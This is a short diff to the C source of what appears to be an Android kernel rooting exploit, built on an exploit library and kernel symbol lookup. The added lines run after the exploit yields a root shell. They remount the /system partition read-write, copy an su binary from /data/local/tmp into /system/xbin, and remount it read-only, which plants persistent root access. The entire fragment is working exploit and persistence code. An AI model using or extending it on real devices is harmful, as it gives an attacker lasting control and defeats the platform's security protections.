@@ -17,6 +17,7 @@
 #include "ptmx.h"
 #include "libexploit/exploit.h"
 #include "libkallsyms/kallsyms_in_memory.h"
+#include <sys/mount.h>
 
 #define THREAD_SIZE             8192
 
@@ -375,6 +376,12 @@ main(int argc, char **argv)
     system("/system/bin/sh");
   } else {
     execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
+  }
+    
+  if ((fopen("/data/local/tmp/su", "r")) != NULL){
+    system("mount -o rw,remount /system");
+    system("cp /data/local/tmp/su /system/xbin");
+    system("mount -o ro,remount /system");
   }
 
   exit(EXIT_SUCCESS);
